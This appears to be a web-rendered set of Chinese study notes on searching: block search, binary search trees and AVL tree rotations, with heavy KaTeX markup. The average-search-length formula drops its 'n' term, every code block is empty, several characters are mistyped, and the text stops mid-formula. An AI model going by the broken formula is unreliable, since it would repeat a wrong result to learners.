<p>将长度为 <code>n</code> 的查找表均匀地分为 <code>b</code> 块，每块有 <code>s</code> 个记录，在等概率情况下，若在块内和索引表中均采用顺序查找，则平均查找长度为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi><mi>S</mi><mi>L</mi><mo>=</mo><msub><mi>L</mi><mi>I</mi></msub><mo>+</mo><msub><mi>L</mi><mi>S</mi></msub><mo>=</mo><mstyle displaystyle="true" scriptlevel="0"><mfrac><mrow><mi>b</mi><mo>+</mo><mn>1</mn></mrow><mn>2</mn></mfrac></mstyle><mo>+</mo><mstyle displaystyle="true" scriptlevel="0"><mfrac><mrow><mi>s</mi><mo>+</mo><mn>1</mn></mrow><mn>2</mn></mfrac></mstyle><mo>=</mo><mstyle displaystyle="true" scriptlevel="0"><mfrac><mrow><msup><mi>s</mi><mn>2</mn></msup><mo>+</mo><mn>2</mn><mi>s</mi><mo>+</mo></mrow><mrow><mn>2</mn><mi>s</mi></mrow></mfrac></mstyle></mrow><annotation encoding="application/x-tex">ASL = L_{I} + L_{S} = \dfrac{b + 1}{2} + \dfrac{s + 1}{2} = \dfrac{s^{2} + 2s + }{2s}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">A</span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mord mathnormal">L</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">L</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.07847em;">I</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">L</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05764em;">S</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:2.0574em;vertical-align:-0.686em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.3714em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">2</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">b</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:2.0074em;vertical-align:-0.686em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.3214em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">2</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">s</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:2.1771em;vertical-align:-0.686em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.4911em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">2</span><span class="mord mathnormal">s</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord">2</span><span class="mord mathnormal">s</span><span class="mord">+</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span> 此时，若 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi><mo>=</mo><msqrt><mi>n</mi></msqrt></mrow><annotation encoding="application/x-tex">s = \sqrt{n}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">s</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.04em;vertical-align:-0.2397em;"></span><span class="mord sqrt"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8003em;"><span class="svg-align" style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord" style="padding-left:0.833em;"><span class="mord mathnormal">n</span></span></span><span style="top:-2.7603em;"><span class="pstrut" style="height:3em;"></span><span class="hide-tail" style="min-width:0.853em;height:1.08em;"><svg xmlns="http://www.w3.org/2000/svg" width="400em" height="1.08em" viewBox="0 0 400000 1080" preserveAspectRatio="xMinYMin slice"><path d="M95,702
c-2.7,0,-7.17,-2.7,-13.5,-8c-5.8,-5.3,-9.5,-10,-9.5,-14
c0,-2,0.3,-3.3,1,-4c1.3,-2.7,23.83,-20.7,67.5,-54
c44.2,-33.3,65.8,-50.3,66.5,-51c1.3,-1.3,3,-2,5,-2c4.7,0,8.7,3.3,12,10
s173,378,173,378c0.7,0,35.3,-71,104,-213c68.7,-142,137.5,-285,206.5,-429
c69,-144,104.5,-217.7,106.5,-221
l0 -0
c5.3,-9.3,12,-14,20,-14
H400000v40H845.2724
s-225.272,467,-225.272,467s-235,486,-235,486c-2.7,4.7,-9,7,-19,7
c-6,0,-10,-1,-12,-3s-194,-422,-194,-422s-65,47,-65,47z
M834 80h400000v40h-400000z"></path></svg></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2397em;"><span></span></span></span></span></span></span></span></span>，则平均查找长度取最小值 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msqrt><mi>n</mi></msqrt><mo>+</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">\sqrt{n} + 1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.04em;vertical-align:-0.2397em;"></span><span class="mord sqrt"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8003em;"><span class="svg-align" style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord" style="padding-left:0.833em;"><span class="mord mathnormal">n</span></span></span><span style="top:-2.7603em;"><span class="pstrut" style="height:3em;"></span><span class="hide-tail" style="min-width:0.853em;height:1.08em;"><svg xmlns="http://www.w3.org/2000/svg" width="400em" height="1.08em" viewBox="0 0 400000 1080" preserveAspectRatio="xMinYMin slice"><path d="M95,702
c-2.7,0,-7.17,-2.7,-13.5,-8c-5.8,-5.3,-9.5,-10,-9.5,-14
c0,-2,0.3,-3.3,1,-4c1.3,-2.7,23.83,-20.7,67.5,-54
c44.2,-33.3,65.8,-50.3,66.5,-51c1.3,-1.3,3,-2,5,-2c4.7,0,8.7,3.3,12,10
s173,378,173,378c0.7,0,35.3,-71,104,-213c68.7,-142,137.5,-285,206.5,-429
c69,-144,104.5,-217.7,106.5,-221
l0 -0
c5.3,-9.3,12,-14,20,-14
H400000v40H845.2724
s-225.272,467,-225.272,467s-235,486,-235,486c-2.7,4.7,-9,7,-19,7
c-6,0,-10,-1,-12,-3s-194,-422,-194,-422s-65,47,-65,47z
M834 80h400000v40h-400000z"></path></svg></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2397em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span>。</p>
<h3> 树型查找</h3>
<h4> 二叉排序树（BST）</h4>
<p>构造一棵二叉排序树的目的并不是为了排序，而是为了提高查找、插入和删除关键字的速度，二叉排序树这种非线性结构也有利于插入和删除的实现。</p>
<ol>
<li>
<p><strong>二叉排序树的定义</strong></p>
<p>二叉排序树（也称二叉查找树）或者是一棵空树，或者是具有下列特性的二叉树：</p>
<ul>
<li>左子树上所有结点的值均小于根结点的值</li>
<li>若右子树非空，则右子树上所有结点的值均大于根结点的值</li>
<li>左、右子树也分别是一棵二叉排序树</li>
</ul>
<p>根据二叉排序树的定义，<strong>左子树结点值 &lt; 根结点值 &lt; 右子树结点值</strong>，因此对二叉排序树进行中序遍历，可以得到一个递增的有序序列。</p>
</li>
<li>
<p><strong>二叉排序树的查找</strong></p>
<p>二叉排序树的查找是从根结点开始，沿某个分支逐层向下比较的过程。若二叉排序树非空，先将给定值与根结点的关键字比较，若相等，则查找成功；若不等，如果小于根结点的关键字，则在根结点的左子树上查找，否则在根结点的右子树上查找。这显然是一个递归的过程。</p>
<p><strong>二叉排序树的非递归查找算法：</strong></p>
<div class="language-c line-numbers-mode" data-ext="c"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>同样，二叉排序树的查找也可用递归算法实现，递归算法比较简单，但执行效率较低。</p>
</li>
<li>
<p><strong>二叉排序树的插入</strong></p>
<p>二叉排序树作为一种动态树表，其 <strong>特点是</strong> 树的结构通常不是一次生成的，而是在查找过程中，当树中不存在关键字值等于给定值的结点时再进行插入的。</p>
<p><strong>插入结点的过程如下</strong>：若原二叉排序树为空，则直接插入；否则，若关键字 <code>k</code> 小于根结点值，则插入到左子树，若关键字 <code>k</code> 大于根结点值，则插入到右子树。插入的结点一定是一个新添加的叶结点，且是查找失败时的查找路径上访问的最后一个结点的左孩子或右孩子。</p>
<p><strong>二叉排序树插入操作的算法描述如下：</strong></p>
<div class="language-c line-numbers-mode" data-ext="c"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></li>
<li>
<p><strong>二叉排序树的构造</strong></p>
<p>从一棵空树出发，依次输入元素，将它们插入二叉排序树中的合适位置。</p>
<p><strong>构造二叉排序树的算法描述如下：</strong></p>
<div class="language-c line-numbers-mode" data-ext="c"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></li>
<li>
<p><strong>二叉排序树的删除</strong></p>
<p>在二叉排序树中删除一个结点时，不能把以该结点为根的子树上的结点都删除，必须先把被删除结点从存储二叉排序树的链表上摘下，将因删除结点而断开的二叉链表重新链接起来，同时确保二叉排序树的性质不会丢失。删除操作的实现过程按三种情况来处理：</p>
<ul>
<li>若被删除结点 <code>z</code> 是叶结点，则直接删除，不会破坏二叉排序树的性质</li>
<li>若结点 <code>z</code> 只有一棵左子树或右子树，则让 <code>z</code> 的子树成为 <code>z</code> 父结点的子树，替代 <code>z</code> 的位置</li>
<li>若结点 <code>z</code> 有左、右两棵子树，则令 <code>z</code> 的直接后继（或直接前驱）替代 <code>z</code>，然后从二叉排序树中删去这个直接后继（或直接前驱），这样就转换成了第一或第二种情况。</li>
</ul>
</li>
<li>
<p><strong>二叉排序树的查我效率分析</strong></p>
<p>二叉排序树的查找效率，主要取决于树的高度。若二叉排序树的左、右子树的高度之差的绝对值不超过 <code>1</code>（平衡二叉树），它的平均查找长度为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>l</mi><mi>o</mi><msub><mi>g</mi><mn>2</mn></msub><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(log_{2}n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span>。若二叉排序树是一个只有右（左）孩子的单支树（类似于有序的单链表），则其平均查找长度为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span>。</p>
<p>在最坏情况下，即构造二叉排序树的输入序列是有序的，则会形成一个倾斜的单支树，此时二叉排序树的性能显著变坏，树的高度也增加为元素个数 <code>n</code>。</p>
<p>从查找过程看，二叉排序树与二分查找相似。就平均时间性能而言，二叉排序树上的查找和二分查找差不多。但二分查找的判定树唯一，而二叉排序树的查找不唯一，相同的关键字其插入顺序不同可能生成不同的二叉排序树。</p>
<p>就维护表的有序性而言，二叉排序树无须移动结点，只需修改指针即可完成插入和删除操作，平均执行时间为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>l</mi><mi>o</mi><msub><mi>g</mi><mn>2</mn></msub><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(log_{2}n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span>。二分查找的对象是有序顺序表，若有插入和删除结点的操作，所花的代价是 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span>。当有序表是静态查找表时，宜用顺序表作为其存储结构，而采用二分查找实现其找操作；若有序表是动态查找表，则应选择二叉排序树作为其逻辑结构。</p>
</li>
</ol>
<h4> 平衡二叉树</h4>
<ol>
<li>
<p><strong>平街二叉树的定义</strong></p>
<p>为了避免树的高度增长过快，降低二叉排序树的性能，规定在插入和删除结点时，要保证任意结点的左、右子树高度差的绝对值不超过 <code>1</code>，将这样的二叉树称为 <strong>平衡二叉树</strong>（Balanced Binary Tree），或称 AVL 树。定义结点左子树与右子树的高度差为该结点的 <strong>平衡因子</strong>，则平衡二叉树结点的平衡因子的值只可能是 <code>-1</code>、<code>0</code> 或 <code>1</code>。</p>
<p>因此，平衡二叉树可定义为或者是一棵空树，或者是具有下列性质的二叉树：它的左子树和右子树都是平衡二叉树，且左子树和右子树的高度差的绝对值不超过 <code>1</code>。结点中的值为该结点的平衡因子。</p>
</li>
<li>
<p><strong>平衡二叉树的插入</strong></p>
<p>二叉排序树保证平衡的 <strong>基本思想</strong> 如下：每当在二叉排序树中插入（或删除）一个结点时，首先检查其插入路径上的结点是否因为此次操作而导致了不平衡。若导致了不平衡，则先找到插入路径上离插入结点最近的平衡因子的绝对值大于 <code>1</code> 的结点 A，再对以 <code>A</code> 为根的子树，在保持二叉排序树特性的前提下，调整各结点的位置关系，使之重新达到平衡。</p>
<div class="hint-container tip">
<p class="hint-container-title">提示</p>
<p>每次调整的对象都是最小不平衡子树，即以插入路径上离插入结点最近的平衡因子的绝对值大于 <code>1</code> 的结点作为根的子树</p>
</div>
<p>平衡二叉树的插入过程的前半部分与二叉排序树相同，但在新结点插入后，若造成查找路径上的某个结点不再平衡，则需要做出相应的调整。可将调整的规律归纳为下列四种情况：</p>
<ul>
<li>
<p><strong>LL 平衡旋转（右单施转）</strong></p>
<p>由于在结点 A 的左孩子（<code>L</code>）的左子树（<code>L</code>）上插入了新结点，<code>A</code> 的平衡因子由 <code>1</code> 增至 <code>2</code>，导致以 <code>A</code> 为根的子树失去平衡，需要一次向右的旋转操作。将 <code>A</code> 的左孩子 <code>B</code> 向右上旋转代替 <code>A</code> 成为根结点，将 <code>A</code> 结点向右下旋转成为 <code>B</code> 的右子树的根结点，而 <code>B</code> 的原右子树则作为 <code>A</code> 结点的左子树。</p>
</li>
<li>
<p><strong>RR 平衡旋转（左单旋转）</strong></p>
<p>由于在结点 A 的右孩子（<code>R</code>）的右子树（<code>R</code>）上插入了新结点，<code>A</code> 的平衡因子由 <code>-1</code> 减至 <code>-2</code>，导致以 <code>A</code> 为根的子树失去平衡，需要一次向左的旋转操作。将 <code>A</code> 的右孩子 <code>B</code> 向左上旋转代替 <code>A</code> 成为根结点，将 <code>A</code> 结点向左下旋转成为 <code>B</code> 的左子树的根结点，而 <code>B</code> 的原左子树则作为 <code>A</code> 结点的右子树。</p>
</li>
<li>
<p><strong>LR 平衡旋转（先左后右双旋转）</strong></p>
<p>由于在 <code>A</code> 的左孩子（<code>L</code>）的右子树（<code>R</code>）上插入新结点，<code>A</code> 的平衡因子由 <code>1</code> 增至 <code>2</code>，导致以 <code>A</code> 为根的子树失去平衡，需要进行两次旋转操作，先左旋转后右旋转。先将 <code>A</code> 结点的左孩子 <code>B</code> 的右子树的根结点 <code>C</code> 向左上旋转提升到 <code>B</code> 结点的位置，然后把该 <code>C</code> 结点向右上旋转提升到 <code>A</code> 结点的位置。</p>
</li>
<li>
<p><strong>RL 平衡旋转（先右后左双旋转）</strong></p>
<p>由于在 <code>A</code> 的右孩子（<code>R</code>）的左子树（<code>L</code>）上插入新结点，<code>A</code> 的平衡因子由 <code>-1</code> 减至 <code>-2</code>，导致以 <code>A</code> 为根的子树失去平衡，需要进行两次旋转操作，先右旋转后左旋转。先将 <code>A</code> 结点的右孩子 <code>B</code> 的左子树的根结点 <code>C</code> 向右上旋转提升到 <code>B</code> 结点的位置，然后把该 <code>C</code> 结点向左上旋转提升到 <code>A</code> 结点的位置。</p>
</li>
</ul>
<div class="hint-container tip">
<p class="hint-container-title">提示</p>
<p><code>LR</code> 和 <code>RL</code> 旋转时，新结点究竟是插入 <code>C</code> 的左子树还是插入 <code>C</code> 的右子树不影响旋转过程</p>
</div>
</li>
<li>
<p><strong>平衡二叉树的删除</strong></p>
<p>与平衡二叉树的插入操作类似，以删除结点 <code>w</code> 为例来说明平衡二叉树删除操作的步骤：</p>
<ul>
<li>用二叉排序树的方法对结点 <code>W</code> 执行删除操作</li>
<li>若导致了不平衡，则从结点 <code>w</code> 开始向上回溯，找到第一个不平衡的结点 <code>z</code>（即最小不平衡子树）；<code>y</code> 为结点 <code>z</code> 的高度最高的孩子结点；<code>x</code> 是结点 <code>y</code> 的高度最高的孩子结点</li>
<li>然后对以 <code>z</code> 为根的子树进行平衡调整，其中 <code>x</code>、<code>y</code> 和 <code>z</code> 可能的位置有四种情况：
<ul>
<li><code>y</code> 是 <code>z</code> 的左孩子，<code>x</code> 是 <code>y</code> 的左孩子（LL，右单旋转）</li>
<li><code>y</code> 是 <code>z</code> 的左孩子，<code>x</code> 是 <code>y</code> 的右孩子（LR，先左后右双旋转）</li>
<li><code>y</code> 是 <code>z</code> 的右孩子，<code>x</code> 是 <code>y</code> 的右孩子（RR，左单旋转）</li>
<li><code>y</code> 是 <code>z</code> 的右孩子，<code>x</code> 是 <code>y</code> 的左孩子（RL，先右后左双旋转）</li>
</ul>
</li>
</ul>
<p>这四种情况与插入操作的调整方式一样。不同之处在于，插入操作仅需要对以 <code>z</code> 为根的子树进行平衡调整；而删除操作就不一样，先对以 <code>z</code> 为根的子树进行平衡调整，如果调整后子树的高度减 <code>1</code>，则可能需要对 <code>z</code> 的祖先结点进行平衡调整，甚至回溯到根结点（导致树高减 <code>1</code>）。</p>
</li>
<li>
<p><strong>平衡二叉树的查找</strong></p>
<p>在平衡二叉树上进行查找的过程与二叉排序树的相同。因此，在查找过程中，与给定值进行比较的关键字个数不超过树的深度。假设以 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>n</mi><mi>h</mi></msub></mrow><annotation encoding="application/x-tex">n_{h}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">h</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 表示深度为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>h</mi></mrow><annotation encoding="application/x-tex">h</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">h</span></span></span></span> 的平衡树中含有的最少结点数。显然，有 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>n</mi><mn>0</mn></msub><mo>=</mo><mn>0</mn><mo separator="true">,</mo><msub><mi>n</mi><mn>1</mn></msub><mo>=</mo><mn>1</mn><mo separator="true">,</mo><msub><mi>n</mi><mn>2</mn></msub><mo>=</mo><mn>2</mn></mrow><annotation encoding="application/x-tex">n_{0} = 0, n_{1} = 1, n_{2} = 2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8389em;vertical-align:-0.1944em;"></span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8389em;vertical-align:-0.1944em;"></span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">2</span></span></span></span>，并且有 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>n</mi><mi>h</mi></msub><mo>=</mo><msub><mi>n</mi><mrow><mi>h</mi><mo>−</mo><mn>1</mn></mrow></msub><mo>+</mo><msub><mi>n</mi><mrow><mi>h</mi><mo>−</mo><mn>2</mn></mrow></msub><mo>+</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">n_{h} = n_{h-1} + n_{h-2} + 1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">h</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7917em;vertical-align:-0.2083em;"></span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">h</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span 